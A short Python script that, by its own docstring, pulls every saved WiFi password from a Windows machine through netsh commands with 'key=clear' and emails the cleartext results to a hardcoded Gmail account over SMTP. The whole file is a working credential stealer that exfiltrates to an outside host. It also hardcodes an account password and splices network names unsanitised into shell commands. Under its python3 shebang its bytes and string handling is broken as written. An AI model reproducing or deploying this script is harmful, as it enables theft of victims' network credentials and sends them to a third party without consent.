#!/usr/bin/env python3

# """This script retrieves saved WiFi passwords from a Windows machine and emails them."""

import subprocess, smtplib, re
def send_mail(email, password, msg):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, msg)
    server.quit()

command = "netsh wlan show profiles"
networks = subprocess.check_output(command, shell=True)
network_name_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_name_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result += current_result

print(result)
send_mail("batman99q@gmail.com", "qwerty&234", result)